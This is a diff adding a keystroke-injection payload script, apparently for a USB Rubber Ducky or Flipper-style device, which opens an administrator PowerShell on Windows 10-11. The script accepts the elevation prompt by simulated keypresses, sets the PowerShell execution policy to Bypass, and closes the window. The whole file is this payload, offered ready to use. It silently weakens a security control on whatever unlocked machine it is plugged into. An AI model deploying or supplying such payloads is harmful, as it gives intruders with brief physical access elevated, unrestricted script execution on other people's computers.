@@ -1,0 +1,31 @@
+REM ####################################################################################
+REM #                                                                                  |
+REM # Title        : Starting a PowerShell with administrator permissions in Windows   |
+REM # Author       : Aleff                                                             |
+REM # Version      : 1.0                                                               |
+REM # Category     : Execute                                                           |
+REM # Target       : Windows 10-11                                                     |
+REM #                                                                                  |
+REM ####################################################################################
+
+REM Requirements:
+REM     - Nothing
+
+DELAY 1000
+GUI x
+DELAY 500
+STRING a
+DELAY 500
+LEFT_ARROW
+DELAY 500
+ENTER
+
+DELAY 2000
+STRINGLN Get-ExecutionPolicy -List
+DELAY 500
+STRINGLN Set-ExecutionPolicy Bypass
+DELAY 500
+STRINGLN Get-ExecutionPolicy -List
+DELAY 500
+
+ALT F4
